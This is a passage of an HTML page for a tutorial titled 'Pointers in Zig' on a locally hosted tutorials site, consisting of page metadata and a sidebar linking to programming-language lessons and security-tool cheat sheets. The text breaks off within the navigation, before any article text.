<!DOCTYPE html>





    

    

    

    

<html lang="en-us"><head><script src="/tutorials/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=tutorials/livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <title>Pointers in Zig | Tutorials</title>
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.">
    <meta name="keywords" content="Documentation, Hugo, Hugo Theme, Bootstrap" />
    <meta name="author" content="Colin Wilson - Lotus Labs" />
    <meta name="email" content="support@aigis.uk" />
    <meta name="website" content="https://lotusdocs.dev" />
    <meta name="Version" content="v0.1.0" />
    
    <link rel="icon" href="http://localhost:1313/tutorials/favicons/favicon.ico" sizes="any">
<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/tutorials/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="512x512"  href="favicons/android-chrome-512x512">
<link rel="icon" type="image/png" sizes="192x192"  href="favicons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/tutorials/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/tutorials/favicons/favicon-16x16.png">
<link rel="manifest" crossorigin="use-credentials" href="http://localhost:1313/tutorials/favicons/site.webmanifest">
<meta property="og:title" content="Pointers in Zig" />
<meta property="og:description" content="Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/tutorials/docs/zig/zig/pointers_in_zig/" /><meta property="og:image" content="http://localhost:1313/tutorials/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_1148297579258235045.png"/><meta property="article:section" content="docs" />

<meta property="article:modified_time" content="2024-06-14T03:48:12+02:00" /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://localhost:1313/tutorials/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_1148297579258235045.png"/>
<meta name="twitter:title" content="Pointers in Zig"/>
<meta name="twitter:description" content="Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software."/>

    
    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
    
    
            
                <script type="text/javascript" src="http://localhost:1313/tutorials/docs/js/flexsearch.bundle.js"></script>
            
        
    
    
    
    
        
        
        
        
    
        
        
        
        
    
    
    <link rel="preconnect" href="https://fonts.gstatic.com/" />
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
    <link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel="stylesheet">

    <link rel="stylesheet" href="/tutorials/docs/scss/style.css" crossorigin="anonymous">
    
    
    </head><body>
    <div class="content">
        <div class="page-wrapper toggled">
<nav id="sidebar" class="sidebar-wrapper">
    <div class="sidebar-brand">
        <a href='/tutorials/' aria-label="HomePage" alt="HomePage">
            
                
            
        </a>
    </div>
    <div class="sidebar-content" style="height: calc(100% - 131px);">
        <ul class="sidebar-menu">
            
                
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">C</i>
                                Cheatsheets
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/osint_cs/">OSINT ( Google operators list )</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/burp_suite_cs/">Burp Suite Cheat sheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/john_the_ripper_cs/">John the ripper Cheat Sheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/metasploit_cs/">Metasploit cheat sheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/nmap_cs/">Nmap cheat sheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/snort_cs/">Snort cheat sheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/sql_injection_cs/">SQL Injection cheat sheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/ssl_tls_vulnerability_cs/">SSL/TLS Vulnerability Cheat Sheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/tcpdump_cs/">TCPdump Cheatsheet</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/cheatsheets/wireshark_cs/">Wireshark Cheat sheet</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">🩸</i>
                                Elixir
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/01_a_beginners_guide_to_elixir/">A beginner&#39;s guide to the Elixir programming language</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/phoenix_elixix_framework/">A Deep Dive into Pheonix Framework</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/03_cli_tool_using_elixir/">Build a CLI Todo List using Elixir</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/client_server_communication_with_gen_server/">Client-server communication with GenServer</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/04_concurrency_in_elixir_with_otp/">Concurrency in Elixir with OTP</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/02_creating_a_simple_web_server/">Create A Simple Web Server using Elixir</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/word_count_tool/">File Word Counter</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/simple_state_management/">Simple state management with agents</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/testing_with_elixir/">Testing in Elixir with ExUnit</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/dockerising_elixir/">Using Docker and Elixir</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/password_generator/">Using Ecto for Database Interactions</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elixir/elixir/using_ecto_for_database_interactions/">Using Ecto for Database Interactions</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                Elm
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/getting_started_with_elm/">A Getting Started Guide With Elm</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/core_concepts/">Core Concepts in Elm</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/building_forms_and_handling_user_input/">Create a Simple Registration Form</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/error_handling_in_elm/">Error Handling in Elm</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/random_quote_generator/">huCreating a Random Quotes App in Elm</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/elms_package_manager/">Package Manager in Elm</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/elm_architecture/">The Elm Architecture</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/elm/elm/working_with_http_requests/">Working with HTTP Requests</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                Erlang
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/getting_started/">A Getting Started Guide with Erlang</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/erlangs_binaries/">Binaries in Erlang Programming Language</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/concurrency_and_process/">Concurrency and Process Management in Erlang</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/databases_in_erlang/">Connecting to SQL Databases Using Erlang&#39;s ODBC Library</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/distributed_programming_in_erlang/">Distributed Programming</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/macros_in_erlang/">Macros in Erlang Programming Language</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/modules_in_erlang/">Modules in Erlang Programming Language</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/pattern_matching/">Pattern Matching in Erlang</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/applications_and_best_practices/">Practical Applications and Best Practices</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/erlangs_otp/">Understanding Erlang&#39;s OTP Framework</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/erlang/erlang/web_development_in_erlang/">Web Programming in Erlang</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">edit</i>
                                Full-Stack Projects
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/text_summarizer/">Build a Text Summarizer using MERN</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/note_taking_application_using_rust_and_react/">Building a Note-Taking Application with Rust and React</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/expense_tracker_using_rust_react/">Building an Expense Tracker with Rust and React</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/calorie_tracker_using_go_react/">Creating a Simple Chat Application using Go and React</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/chat_application_using_react_and_go/">Creating a Simple Chat Application using Go and React</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/creating_a_job_summarizer_using_streamlit_and_open_ai/">Job Description Summarizer with Streamlit and OpenAI</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/progres_checker/">Progress Tracker using React and Local Storage</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/password_validator/">Simple Password Validator using React &#43; Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/full-stack-projects/full-stack-projects/task_manager_using_react/">Task Manager using Django and React</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">folder</i>
                                Golang
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/error-handling-and-panics-in-go/">Advanced Error Handling in Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/building-real-world-application-go/">Building a Real-World Application in Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/microservices-with-go/">Building Microservices with Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/packages-and-dependency-management-in-go/">Efficient Go Programming</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/advanced-features-of-go/">Exploring Advanced Features of Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/concurrency-in-go-channels/">Exploring Channels in Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/functions-in-go/">Exploring Functions in Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/getting-started-with-go/">Getting Started with Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/understanding-go-basics/">Master the Basics of Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/concurrency-in-go-routines/">Mastering Concurrency in Go with Goroutines</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/testing-in-go/">Mastering Testing in Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/structs-and-interfaces-in-go/">Understanding Structs and Interfaces in Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/using-databases-in-go/">Using Databases in Go</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/golang/golang/working-with-collections-in-go/">Working with Collections in Go</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">function</i>
                                Haskell
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/building-real-world-haskell-application/">Building a Real-World Haskell Application</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/diving-deeper-into-haskell-functions/">Diving Deeper into Haskell Functions</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/error-handling-in-haskell/">Effective Error Handling in Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/testing-and-debugging-in-haskell/">Effective Testing and Debugging in Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/advanced-data-types-in-haskell/">Exploring Advanced Data Types in Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/functional-design-patterns-in-haskell/">Exploring Functional Design Patterns in Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/exploring-haskell-syntax-basic-concepts/">Exploring Haskell Syntax and Basic Concepts</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/concurrency-and-parallelism-in-haskell/">Harnessing Concurrency and Parallelism in Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/interfacing-with-databases-in-haskell/">Interfacing Databases with Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/introduction-to-haskell/">Introduction to Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/module-system-in-haskell/">Mastering Haskell’s Module System for Efficient Code Organization</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/working-with-lists-in-haskell/">Mastering List Operations in Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/monad-magic-in-haskell/">Monad Magic in Haskell</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/haskell/haskell/type-classes-and-polymorphism-in-haskell/">Understanding Type Classes and Polymorphism in Haskell</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">/</i>
                                HTMX
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/getting_started_with_htmx/">A Getting started guide with HTMX</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/ajax_in_htmx/">AJAX in HTMX</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/caching/">Caching</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/some_examples_using_htmx/">htmx usage with Django</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/some_hx_attributes/">Other hx-Attributes</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/security_in_htmx/">Security in HTMX</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/web_security_basics_using_htmx/">Web Security Basics using HTMX</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/htmx/htmx/web_socket_and_sse/">Web Socket and SSE</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                huff
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/simple_huff_program_to_determine_even_numbers/">A simple Huff Program to Determine Even Number</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/introduction_to_huff/">An Introduction to Huff</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/signature_verification_huff_contract/">Creating a Huff Contract for Signature Verification</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/creating_a_token_in_huff/">Creating a Token With Huff</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/writing_your_first_huff_contract/">Hello World using Huff</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/reverse_calldata_with_huff/">Reversing Calldata with Huff: A Step-by-Step Tutorial</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/advanced_features_using_huff/">Some Advanced Features With Huff</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/testing_and_deploying_huff_contracts/">Testing and Deploying Huff Contracts</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/huff/huff/understanding_huff_macros/">Understanding Huff Macros</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                Julia
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/getting_started_with_julia/">A Getting Started Guide with Julia</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/asynchronous_programming/">Asynchronous Programming with Julia</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/basic_calculator_with_julia/">Basic Calculator with Julia</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/advanced_features_in_julia/">Learn About Advanced Features with Julia</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/modules_in_julia/">Modules in Julia</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/multi-thread/">Multi-Thread Programming with Julia</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/object_oriented_programming/">Object Oriented Programming with Julia</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/julia/julia/scientific_computing/">Scientific Computing with Julia</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">K</i>
                                keras
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/keras/keras/introduction_to_keras/">An Introduction to keras</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/keras/keras/deploying_keras_models/">Deploying Keras Models</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/keras/keras/evaluation_and_prediction/">Model evaludation and prediction in keras(Advanced)</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/keras/keras/advanced_model_tuning_andoptimization_techniques_in_keras/">Model Tuning and Optimization Techniques in Keras </a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/keras/keras/modules_in_keras/">Modules in keras</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/keras/keras/training_models_on_arbitrary_data_sources/">Training models on arbitrary data sources</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/keras/keras/writing_cross_framework_custom_components/">Writing cross-framework custom components</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">🔥</i>
                                Mojo
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/mojo/mojo/introduction_to_mojo/">A Getting Started Guide to Mojo</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/mojo/mojo/data_types_variables_operators/">Data Types, Variables, and Operators in Mojo</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/mojo/mojo/functions_in_mojo/">Functions in Mojo</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/mojo/mojo/using_python_in_mojo/">Interoperability with Python</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/mojo/mojo/modules_and_packages/">Modules and Packages in Mojo</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/mojo/mojo/oop/">Object-Oriented Programming (OOP) Concepts in Mojo</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                Nim
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/nim/">An Introduction to Nim</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/basic_data_types/">Basic data types in Nim</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/channels_in_nim/">Channels in Nim</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/concurrency_in_nim/">Concurrency in Nim</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/containers/">Containers and Procedures in Nim</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/control_flow/">Control flow in Nim</a></li>
                                        
                                    
                                        
                                        
